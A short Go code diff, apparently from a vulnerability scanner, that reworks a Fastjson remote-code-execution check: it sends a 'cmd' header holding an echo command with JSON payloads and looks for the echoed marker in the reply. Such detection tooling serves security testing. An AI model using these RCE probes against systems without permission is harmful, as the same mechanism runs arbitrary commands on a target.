@@ -13,7 +13,6 @@ func Check(u string) string {
 	for _, jsonurl := range domainx {
 		header := make(map[string]string)
 		header["Content-Type"] = "application/json"
-		header["cmd"] = "echo vscanfj"
 		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
 			for _, payload := range fastjsonJndiPayloads {
 				randomstr := pkg.RandomStr()
@@ -25,9 +24,10 @@ func Check(u string) string {
 				}
 			}
 		} else {
+			header["cmd"] = "echo jsonvuln"
 			for _, payload := range fastjsonEchoPayloads {
 				if req, err := pkg.HttpRequset(jsonurl, "POST", payload, false, header); err == nil {
-					if strings.Contains(req.Body, "vscanfj") {
+					if strings.Contains(req.Body, "jsonvuln") {
 						pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson ECHO RCE |%s\n", u))
 						return "ECHO RCE"
 					}
